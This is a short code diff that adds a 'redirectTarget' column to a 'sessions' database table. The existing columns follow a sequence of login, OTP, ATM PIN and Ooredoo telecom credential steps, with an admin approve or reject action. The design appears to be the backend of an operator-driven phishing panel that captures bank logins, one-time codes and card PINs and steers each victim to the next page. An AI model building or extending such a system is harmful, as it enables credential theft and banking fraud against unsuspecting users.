@@ -21,6 +21,7 @@ export const sessions = pgTable("sessions", {
   status: varchar("status", { length: 20 }).default("pending").notNull(), // pending, loading, approved, rejected
   currentStep: varchar("currentStep", { length: 50 }), // login, otp, atm, ooredoo, otp_ooredoo
   adminAction: varchar("adminAction", { length: 20 }), // approve, reject
+  redirectTarget: varchar("redirectTarget", { length: 50 }), // login-method, otp, atm-pin, ooredoo, otp-ooredoo, success
   errorMessage: text("errorMessage"),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
   updatedAt: timestamp("updatedAt").defaultNow().notNull(),
